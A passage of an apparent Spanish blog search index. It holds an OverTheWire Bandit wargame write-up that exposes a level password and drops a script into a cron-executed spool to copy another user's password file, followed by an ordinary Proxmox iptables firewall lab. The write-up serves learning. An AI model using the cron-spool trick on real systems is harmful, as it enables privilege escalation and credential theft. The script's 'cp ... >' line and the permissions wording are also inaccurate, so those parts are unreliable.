conectamos como usuario bandit23sshpass -p 'QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G' ssh bandit23@bandit.labs.overthewire.org -p 2220Un programa está corriendo con cron, en este nivel deberemos de crear nuestro propio script y añadirlo a una ruta específica para darnos acceso al siguiente nivelLa tarea cron:bandit23@bandit:/etc/cron.d$ cat cronjob_bandit24@reboot bandit24 /usr/bin/cronjob_bandit24.sh &amp;&gt; /dev/null* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &amp;&gt; /dev/nullbandit23@bandit:/etc/cron.d$El script que se está ejecutando:bandit23@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit24.sh#!/bin/bashmyname=$(whoami)cd /var/spool/$myname/foo || exit 1echo \"Executing and deleting all scripts in /var/spool/$myname/foo:\"for i in * .*;do    if [ \"$i\" != \".\" -a \"$i\" != \"..\" ];    then        echo \"Handling $i\"        owner=\"$(stat --format \"%U\" ./$i)\"        if [ \"${owner}\" = \"bandit23\" ]; then            timeout -s 9 60 ./$i        fi        rm -rf ./$i    fidonebandit23@bandit:/etc/cron.d$Así que deberemos crear un script, meterlo en /var/spool/bandit24/foo para que sea ejecutadoEl script:bandit23@bandit:/tmp/tmp.HIvvMQds5Z$ cat myScript.sh#!/bin/bashcp /etc/bandit_pass/bandit24 &gt; /tmp/tmp.HIvvMQds5Z/bandit_pass24chmod o+r /tmp/tmp.HIvvMQds5Z/bandit_pass24bandit23@bandit:/tmp/tmp.HIvvMQds5Z$Este script copiará la contraseña de bandit24 al directorio que le hemos especificado, el cuál hemos creado previamente, posteriormente le damos permisos de ejecución y lo copiamos en /var/spool/bandit24/foo/Continuará :)"
  },
  
  {
    "title": "Laboratorio con Firewall en Proxmox",
    "url": "/posts/Laboratorio-Proxmox/",
    "categories": "Proxmox",
    "tags": "Virtualización, Proxmox",
    "date": "2023-05-18 00:00:00 +0200",
    





    
    "snippet": "En esta práctica vamos a configurar dos máquinas Ubuntu Linux, una será el cliente y la otra actuará como Firewall.Esquema de la prácticaEl esquema consiste en:  Una máquina que servirá de Firewall...",
    "content": "En esta práctica vamos a configurar dos máquinas Ubuntu Linux, una será el cliente y la otra actuará como Firewall.Esquema de la prácticaEl esquema consiste en:  Una máquina que servirá de Firewall que será un contenedor Ubuntu en nuestro servidor Proxmox con dos tarjetas de red, la externa tendrá la IP 192.168.28.200 y la interna la IP 192.168.14.1.  Dentro de la red también habrá un dispositivo Switch con la IP 192.168.14.100.  Un cliente que será otro contenedor Ubuntu y tendrá la IP 192.168.14.10.Creando Switch en ProxmoxNos dirigimos a nuestro nodo principal y a System &gt; Network, pulsamos en create y a Linux Bridge.Y le asignamos la IP 192.168.14.100.Nos dirigimos a nuestro “Storage” del nodo principal y nos descargamos una versión de Ubuntu, en mi caso me he descargado la Ubuntu 22.04 Jammy.Una vez creado los contenedores, vamos a ver su configuración de red.Configuración de red del contenedor FirewallConfiguración de red del contenedor UbuntuClienteProbando conectividad en las máquinasUna vez arrancados los dos contenedores, vamos a empezar por hacer ping desde ClienteUbuntu hasta el Switch que tiene la IP 192.168.14.100.root@ClienteUbuntu:~# ping -c 4 192.168.14.100PING 192.168.14.100 (192.168.14.100) 56(84) bytes of data.64 bytes from 192.168.14.100: icmp_seq=1 ttl=64 time=0.058 ms64 bytes from 192.168.14.100: icmp_seq=2 ttl=64 time=0.048 ms64 bytes from 192.168.14.100: icmp_seq=3 ttl=64 time=0.063 ms64 bytes from 192.168.14.100: icmp_seq=4 ttl=64 time=0.044 ms--- 192.168.14.100 ping statistics ---4 packets transmitted, 4 received, 0% packet loss, time 3075msrtt min/avg/max/mdev = 0.044/0.053/0.063/0.007 msroot@ClienteUbuntu:~#También comprobaremos que existe conectividad entre ClienteUbuntu y las dos patas del Firewall, que sus IPs son 192.168.14.1 y 192.168.28.200.root@ClienteUbuntu:~# ping -c 2 192.168.14.1PING 192.168.14.1 (192.168.14.1) 56(84) bytes of data.64 bytes from 192.168.14.1: icmp_seq=1 ttl=64 time=0.052 ms64 bytes from 192.168.14.1: icmp_seq=2 ttl=64 time=0.050 ms--- 192.168.14.1 ping statistics ---2 packets transmitted, 2 received, 0% packet loss, time 1002msrtt min/avg/max/mdev = 0.050/0.051/0.052/0.001 msroot@ClienteUbuntu:~# ping -c 2 192.168.28.200PING 192.168.28.200 (192.168.28.200) 56(84) bytes of data.64 bytes from 192.168.28.200: icmp_seq=1 ttl=64 time=0.050 ms64 bytes from 192.168.28.200: icmp_seq=2 ttl=64 time=0.083 ms--- 192.168.28.200 ping statistics ---2 packets transmitted, 2 received, 0% packet loss, time 1024msrtt min/avg/max/mdev = 0.050/0.066/0.083/0.016 msroot@ClienteUbuntu:~# La máquina Firewall tiene conectividad con la máquina ClienteUbuntu, también con el Switch, y conectividad con el exterior.root@Firewall:~# ping -c 2 192.168.14.10PING 192.168.14.10 (192.168.14.10) 56(84) bytes of data.64 bytes from 192.168.14.10: icmp_seq=1 ttl=64 time=0.078 ms64 bytes from 192.168.14.10: icmp_seq=2 ttl=64 time=0.050 ms--- 192.168.14.10 ping statistics ---2 packets transmitted, 2 received, 0% packet loss, time 1003msrtt min/avg/max/mdev = 0.050/0.064/0.078/0.014 msroot@Firewall:~# ping -c 2 192.168.14.100PING 192.168.14.100 (192.168.14.100) 56(84) bytes of data.64 bytes from 192.168.14.100: icmp_seq=1 ttl=64 time=0.066 ms64 bytes from 192.168.14.100: icmp_seq=2 ttl=64 time=0.049 ms--- 192.168.14.100 ping statistics ---2 packets transmitted, 2 received, 0% packet loss, time 1001msrtt min/avg/max/mdev = 0.049/0.057/0.066/0.008 msroot@Firewall:~# ping -c 2 8.8.8.8 PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.64 bytes from 8.8.8.8: icmp_seq=1 ttl=248 time=12.6 ms64 bytes from 8.8.8.8: icmp_seq=2 ttl=248 time=14.7 ms--- 8.8.8.8 ping statistics ---2 packets transmitted, 2 received, 0% packet loss, time 1002msrtt min/avg/max/mdev = 12.583/13.647/14.712/1.064 msroot@Firewall:~# Configuración y activación de IptablesEl siguiente paso será configurar y activar Iptables, pero antes de nada, ¿Qué carajos es Iptables?Iptables básicamente es un programa que viene por defecto en sistemas Linux y nos permite configurar el firewall o cortafuegos.  Antes de nada vamos a hacer una configuración previa.Listamos las interfaces que tiene nuestra máquina Firewall en la ruta /sys/class/net/.rootFirewall:~# ls /sys/class/net/eth0  lo  net14root@Firewall:~# @Ahora vamos a habilitar el reenvío de paquetes en el Firewall, para que actue como Router.Se hace con el siguiente comando:root@Firewall:~# echo 1 &gt; /proc/sys/net/ipv4/ip_forwardroot@Firewall:~# Ahora si hacemos ping desde la máquina ClienteUbuntu hacia una máquina de nuestra red local, debería funcionar.root@ClienteUbuntu:~# ping -c 2 192.168.28.108PING 192.168.28.108 (192.168.28.108) 56(84) bytes of data.64 bytes from 192.168.28.108: icmp_seq=1 ttl=64 time=158 ms64 bytes from 192.168.28.108: icmp_seq=2 ttl=64 time=56.4 ms--- 192.168.28.108 ping statistics ---2 packets transmitted, 2 received, 0% packet loss, time 1001msrtt min/avg/max/mdev = 56.433/107.326/158.220/50.893 msroot@ClienteUbuntu:~#Pero esto que hemos hecho no se queda de forma permanente, cuando reiniciemos el sistema dejará de funcionar.Para ello, debemos editar el fichero /etc/sysctl.conf y descomentar la línea que pone #net.ipv4.ip_forward=1Para aplicar la configuración que acabamos de hacer vamos a usar el comando sudo sysctl -p /etc/sysctl.confsudo sysctl -p /etc/sysctl.conf  Ahora si, pasamos a configurar Iptables.Listamos las reglas que tiene Iptables actualmente:root@Firewall:~# iptables -L -nvChain INPUT (policy ACCEPT 0 packets, 0 bytes) pkts bytes target     prot opt in     out     source               destination         Chain FORWARD (policy ACCEPT 0 packets, 0 bytes) pkts bytes target     prot opt in     out     source               destination         Chain OUTPUT (policy ACCEPT 0 packets, 0 bytes) pkts bytes target     prot opt in     out     source               destination         root@Firewall:~# Por último vamos a agregar una regla para que la máquina ClienteUbuntu tenga acceso a internet.root@Firewall:~# iptables -t nat -A POSTROUTING -s 192.168.14.0/24 -o eth0 -j MASQUERADEroot@Firewall:~#   MASQUERADE permite que la red 192.168.14.0 tenga enmascaramiento y tenga una IP válida para salir al exterior.Si hacemos ping a la IP de google (8.8.8.8) funciona correctamente.root@ClienteUbuntu:~# ping -c 2 8.8.8.8PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.64 bytes from 8.8.8.8: icmp_seq=1 ttl=247 time=11.1 ms64 bytes from 8.8.8.8: icmp_seq=2 ttl=247 time=10.7 ms--- 8.8.8.8 ping statistics ---2 packets transmitted, 2 received, 0% packet loss, time 1001msrtt min/avg/max/mdev = 10.696/10.897/11.099/0.201 msroot@ClienteUbuntu:~# Guardar configuración de IptablesTodos los cambios realizados en Iptables se borrarán una vez reiniciemos la máquina Firewall, así que vamos a aprender como podemos guardar todos los cambios.Instalamos el paquete iptables-persistent (Cuando nos pregunte Save current IPv4/IPv6 rules? le damos a Yes)root@Firewall:~# apt install iptables-persistent -yReading package lists... DoneBuilding dependency tree... DoneReading state information... Doneiptables-persistent is already the newest version (1.0.16).0 upgraded, 0 newly installed, 0 to remove and 117 not upgraded.root@Firewall:~# Guardamos la configuración con este comando:root@Firewall:~# netfilter-persistent saverun-parts: executing /usr/share/netfilter-persistent/plugins.d/15-ip4tables saverun-parts: executing /usr/share/netfilter-persistent/plugins.d/25-ip6tables saveroot@Firewall:~#Si reiniciamos la máquina, nuestras reglas de Iptables seguirán como estaban configuradas.Y aquí da por finalizado el laboratorio, muchas gracias por leer el post, nos vemos en el próximo :)"
  }
  
]

